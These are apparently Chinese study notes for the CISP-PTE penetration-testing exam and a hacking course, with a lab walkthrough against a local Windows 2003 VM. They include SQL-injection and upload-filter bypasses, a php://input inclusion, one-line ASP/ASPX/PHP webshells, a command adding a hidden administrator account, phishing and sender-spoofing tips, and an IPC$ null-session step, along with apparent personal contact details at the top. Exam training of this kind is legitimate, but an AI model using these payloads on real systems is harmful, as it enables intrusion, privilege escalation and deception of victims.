郝永清

hyqkx1977@263.net

18610677915

cisp-pte:

20道单选：腾讯安全面试题：多选

21-25：key:8 centos:172.16.12.100:81-85

综合题：三个key

第一题：sql注入：waf,穿waf

空格，union

sqlmap.py: --tamper "space2plus.py"

d:\安全工具

sqlmap:复制到根目录 

手工注入：

第二题：上传漏洞：

只允许上传jpg

php3,php5解析漏洞

文件头修改：burp:

过滤一句话：eval,request

php读文件

&lt;?php readfile\("../key"\);?&gt;

第三题：文件包含：难

php伪协议

file=php://input

post data:

&lt;?php readfile\("../key"\);?&gt;

第四题：命令执行：

过滤：cat,vi,less,more,head,tail,tailf,tac,sed

\|head ../key.php\|grep key

vi,sed

第五题：日志分析：经验：

前半部分：漏扫结果：404

12.12，200空格 adminlogin.php,登录，黑客攻击方法：暴力破解，burp:password:password123

验证码爆破：新题：username=admin

综合题：win2003,apsx+mssqlserver

1key:登录key:nmap扫描端口：20000-30000

御剑扫描：弱点：配置文件：web.config,web.config.bak

数据库连接密码

数据库连接：navicat:登录密码在表里

2key:上传：观察，长文件名截断

3key:桌面：key.txt:sa权限：xp\_cmdshell,提权，shift后门（正解）关闭防火墙，启动3389：网上邻居

黑客：天才的程序员，在攻与防中寻求对立统一的

杀毒软件

病毒：勒索，免杀：

cve-2017-8759,cve-2017-1188222:通杀17年：公式编辑器：汇编打补丁，43

传统安全：发现黑客入侵：1.1.1.1 防火墙：deny

翻墙：租国外服务，vps,本机shadowsocks 

手机：切换国外市场，

找漏洞：入侵还原--应急响应：日志分析，收集日志，但不分析，事后分析：内鬼 留存不少于六个月，

可视化：监控，

owasp top 10:

乌云：

黑帽：

黑客常用攻击方法：

一。溢出攻击：栈，堆 

1.远程溢出：国宝级，40--120 溢出工具+ip--&gt;cmdshell:system&gt;administrator ms12-020:3389:远程桌面，shellcode:蓝屏，mysql:strcpy\(\)user and pass&gt;256--root 拖库

12306：撞库：14万，马，帐户密码，身份证号码，手机号

网易：126，163，5亿条 taobao:50-100

ms08-067,ms06-040:netapi32.dll 303 rpc \\ip



0day:未公布

1day:公布当天：对比补丁

2.本地溢出：提权 360，瑞星，金山，serv-u:ftp

未公布漏洞：

PTE考试专用

汇编：挖掘漏洞，破解，病毒木马分析：wanacry,逆向工程，代码重塑，设备后门：中兴，华为：隐蔽ID,cisco:后门

Olldbg,ida:

破解原理：关键字：注册用户，注册失败，注册完成，关键跳：je--&gt;jnz,nop:90

二。邮件攻击：

1.邮箱密码破解：时间

微信，voxer:特种兵,控守，telegram,bbm

2.邮件钓鱼：关于年终奖发放的通知，美女，特价，附件绑马：

office:.doc.rtf.ppt.xls

jpg

pdf

.txt:未公布



3.伪装发件：

lele78@263.net

1e1e78@263.net

1l,0O

伪装为任何人，

4.邮件跨站：gmail,yahoo,%60 未公布：

rar加密：中文，

三。手机安全

1.充电器，充电宝有后门，照片，通讯录

2.伪基站钓鱼：10086，兑奖

3.usim复制：无服务--银行：解除绑定

4.app:应用克隆：微信，支付宝，逻辑漏洞：绕过，业务交易劫持

gsm劫持--短信

5.呼死你：电话，短信

6.手机远程控制：droidjack:

安卓：10万：12个月免杀+6免杀

苹果：25万

微信记录，陌陌记录，环境录音，通话录音，短信控制，app管理，上网行为，偷拍：



入侵思路：方法

准备工作：

1.windows:关闭防火墙，关闭defender:gpedit.msc,杀毒软件：关掉

2.浏览器：考试：90secfirefox:hackbar

ie:安全级别：最低

隐私设置：接受所有cookie

高级选项：去掉：显示友好的http错误信息，500：内部错误

C:\papaguestbook\include\data\\#baba@yaoyao520.mdb

\#：%23

%:%25

':%27

关闭xss筛选：



一。入侵论坛：dvbbs

user and pass--&gt;数据库：下载：位置--》暴库

1.www.xx.com/bbs/a.asp:第二个/换为%5c=\

2.www.xx.com/include/conn.asp

3.加单引号：

4.id=1 修改；

id=999999

id=a

id\[\]=1

5.aspx:.net web.config--&gt;任意文件下载，web.config.bak

数据库连接用户和密码

6.aspx:脚本前加~ ~a.aspx

7.php:config.inc.php

8.jsp:%81,www.xx.com/noexit.jsp;.JSP .js%2570

/WEB\_INF/.class java反编译

 dvbbs:

1.domain:旁注检测--网站批量检测：页面全选：添加指定网址：www.dvbbs.com

检测漏洞：

1）.上传：不可利用

2\).数据库：位置--右键--打开网址---下载到桌面

3\).后台登录：不可用

2.分析数据库：domain--数据库管理--打开：

dv\_admin

username:admin

password:3eef656b9031990f

md5:单向不可逆的HASH函数，

破解：彩虹表 明文--散值

www.cmd5.com

www.xmd5.com

dv\_log:日志存储明文口令：

字段名：l\_content 关键字：pass

username2=admin

password2=lyckx1988



https:ssl 443

cipher suite:算法套件

ecdhe\(密钥交换\)-rsa\(数字签名\)-aes\(加密\)-sha256

md5完整性：碰撞

323B453885F5181F

E4661368943DACB5

二。入侵服务器：上传webshell

c.asp:pass:kongqi

trs:后台验证缺失，注入，上传

上传过程检测：

1.客户端javascript脚本检测：burp：没有抓到包

2.服务端检测mime内容：http 头：content-Type:image/gif

image/jpeg

3.服务端检测路径：path参数

4.服务端检测扩展名：允许，白名单，黑名单

5.服务端检测内容：恶意代码

文件头：gif:GIF89a

一句话

iframe

script

src=http

上传：

1.没有任何限制，直接上传

baidu:inurl:upload.asp 上传

2.黑名单：拒绝：asa,asp,asax,html,

绕过：c.cer证书,c.cdx 复合索引

3.大小写转换：c.AsP

4.a\#2easp

5.a.asp.

6.a.asp;

7.a.asp空格：burp

8.绕过客户端javascript脚本检测：

浏览器插件：禁用，firebug

用代理绕过：c.asp--改为c.jpg--&gt;burp--c.jpg改为:c.asp--forward

9.win2003:解析漏洞：

建立文件夹：aa.asp

里面放任何文件，都会解析为asp脚本文件

10.白名单：

只允许上传：jpg

c.asp;.jpg

11.nullbyte:空字符：0x00

a.asp.jpg--&gt;burp---hex:最后一个.改为00

操作系统：00，自动截断

12。apache:mime.types

由右向左：

c.php.rar.rar.rar

http://www.x.com/a.php?id=a.jpg/noexit.php

13.第二道：apache:php3,php5

只允上传.jpg

随意搜索一个jpg（小）--上传--burp:post

文件名：a.php3

图片末尾插入一句话木话变种马，php读文件

14.一句话木马：

ASP一句话：

&lt;%execute\(request\("cmd"\)\)%&gt;



ASPX一句话：

&lt;%@ Page Language="Jscript"%&gt;&lt;%Response.Write\(eval\(Request.Item\["z"\],"unsafe"\)\);%&gt;



\*PHP一句话：

&lt;?php eval\($\_POST\[cmd\]\);?&gt;



菜刀：chopper

右键--添加--上传webshell地址，连接口令：

15.绕过mime检测：

burp抓包--content-Type:image/gif

16.文件幻数：检测文件头：

GIF89a换行

&lt;一句话木马&gt;

17.查看源码：allow=no 改为yes

dvbbs:

1.前台：发表话题

上传文件：上传类型：图片

c.asp改为c.jpg

记下上传路径UploadFile/2018-8/20188128856526.jpg

2.后台：数据库备份

当前数据库路径：图片路径

备份目录：databackup

数据名称：姓名拼音首字母.asp

访问：http://www.dvbbs.com/databackup/hyq.asp

pass:kongqi

三。提权

前提：serv-u:密码改为空：默认密码是：123，重启服务



登录webshell:

http://www.dvbbs.com/databackup/hyq.asp

提权相关：serv-u提权---命令：修改两处：kongqi$ 改为你的姓名拼音首字母

cmd /c net user kongqi$ 123456 /add & net localgroup administrators kongqi$ /add

漏洞利用：

1.远程桌面：rdp:3389 mstsc:

2.ipc空连接：

net use \\ip\ipc$

输入用户名和密码

net use k: \\ip\c$

pet:pass:admin123



实验环境：

一。启动信息安全学习资料里的vm2003

pass:gooann

1.网卡类型改为仅主机，ip:192.168.2.5

2.管理工具--iis服务管理器--网站--dvbbs:启动

主机头值：192.168.2.5

右键--属性--网站--高级：

二。真机：vmnet1:192.168.2.6

三。http://192.168.2.5

实验步骤：

一。入侵论坛：

1.domain:旁注检测--网站批量检测：页面：全选，添加指定网址：http://192.168.2.5

扫描漏洞：上传，后台：不可用

数据库：右键--打开网址--下载到桌面

2。数据库分析：domain--数据库管理--打开

dv\_admin:

password:md5

dv\_log:字段名：选择：l\_content 关键字：pass

二。上传webshell:

c.asp:pass:kongqi

菜刀：chopper,上传一句话

1.前台：发表话题

上传文件：把c.asp改为c.jpg

记下上传路径

2.后台：数据库备份：备份为asp

当前数据库路径：上传图片路径

备份目录：databackp:不要修改

备份名称：姓名拼音首字母.asp

3.访问：http://192.168.2.5/databackup/hyq.asp

三。提权：

前提：serv-u密码改为空，默认：123，重新启动服务

1.登录webshell:提权相关--serv-u:修改命令两个地方：kongqi$改为你姓名拼音

2.利用漏洞

a.远程桌面：探测：nmap -sS ip

nmap -p 20000-30000 ip

webshell探测

b.ipc空连接















